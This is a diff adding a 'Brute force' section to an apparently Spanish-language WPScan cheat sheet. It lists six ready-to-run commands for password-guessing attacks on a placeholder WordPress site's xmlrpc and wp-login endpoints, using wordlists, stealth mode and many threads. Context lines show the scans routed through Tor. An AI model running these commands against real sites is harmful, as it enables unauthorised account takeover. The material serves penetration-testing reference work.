@@ -28,3 +28,28 @@ wpscan --url http://sitio-web.com --user-agent "Mozilla/5.0 (Windows NT 10.0; Wi
 ```
 wpscan --url http://sitio-web.com --proxy socks5://127.0.0.1:9050
 ```
+## Brute force
+
+```
+wpscan --url http://sitio-web.com --password-attack xmlrpc -U admin -P dicc.txt
+```
+
+```
+wpscan --url http://sitio-web.com --password-attack wp-login -U admin -P dicc.txt
+```
+
+```
+wpscan --url http://sitio-web.com -U carlos -P diccionario.txt
+```
+
+```
+wpscan --url http://sitio-web.com -U lista_usuarios.txt -P diccionario.txt
+```
+
+```
+wpscan --url http://sitio-web.com -e u --passwords diccionario.txt
+```
+
+```
+wpscan --url http://sitio-web.com -U admin -P dicc.txt --stealthy --threads 50
+```
